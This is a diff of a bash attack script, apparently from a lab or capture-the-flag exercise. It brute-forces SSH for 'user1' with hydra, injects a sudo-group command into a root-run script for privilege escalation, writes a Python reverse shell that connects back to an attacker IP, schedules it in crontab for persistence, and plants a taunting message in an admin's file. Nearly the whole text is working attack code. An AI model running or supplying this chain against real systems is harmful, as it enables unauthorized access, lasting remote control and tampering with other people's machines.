@@ -1,15 +1,24 @@
-#Brute Force SSH for user1
+#Get attacker ip
+read -p "What is the attacker IP:" attacker_ip
 
-#Add create user line to Hello.sh
+#Get victim ip
+read -p "What is the victim IP:" victim_ip
+
+#Brute Force SSH for user1
+hydra -l user1 -P /usr/share/wordlists/john.lst -t 6 ssh://$victim_ip
+
+#Add user1 to sudo gropu line to Hello.sh
+sudo bash -c 'printf "%s\n" "sudo usermod -aG sudo user1" >> /usr/local/bin/Hello.sh'
 
 #Wait 6 seconds for user to be created
-
-#Login as the new user
+sleep 6
 
 #Create python rev shell file
-sudo bash -c 'printf "%s\n" "export RHOST=$ip;export RPORT=6969;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'" > sus.py'
+sudo bash -c 'printf "%s\n" "export RHOST=$attacker_ip;export RPORT=6969;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'" > /home/user1/sus.py'
 
 #Add rev shell to crontab
+echo "*/5 * * * * /usr/bin/python3 /home/user1/sus.py" | sudo crontab -
+
 
 #Adds text to admins donttouch.txt
-sudo bash -c 'printf "%s\n" "I am in, you cannot find me" > /home/admin1/donttouch.txt'
+echo "I am in, you cannot find me" > /home/admin1/donttouch.txt
